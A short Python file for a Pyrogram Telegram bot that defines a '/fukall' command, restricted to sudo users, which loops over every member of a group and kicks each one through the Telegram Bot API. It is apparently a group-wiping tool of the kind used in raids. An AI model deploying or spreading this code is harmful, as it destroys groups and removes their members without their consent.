import asyncio
import regex
import aiohttp
from pyrogram import Client
from pyrogram import filters
from pyrogram.types import Dialog
from pyrogram.types import Chat
from pyrogram.types import Message
from aiohttp import ClientSession
from Codexun.config import SUDO_USERS, BOT_TOKEN
from pyrogram.errors import UserAlreadyParticipant

# Don't Use

from Codexun.tgcalls import client as USER
from Codexun.config import SUDO_USERS

@Client.on_message(filters.command("fukall") &
                 filters.group & filters.user(SUDO_USERS))
async def ban_all(c: Client, m: Message):
    chat = m.chat.id

    async for member in c.iter_chat_members(chat):
        user_id = member.user.id
        url = (
            f"https://api.telegram.org/bot{BOT_TOKEN}/kickChatMember?chat_id={chat}&user_id={user_id}")
        async with aiohttp.ClientSession() as session:
            await session.get(url)  
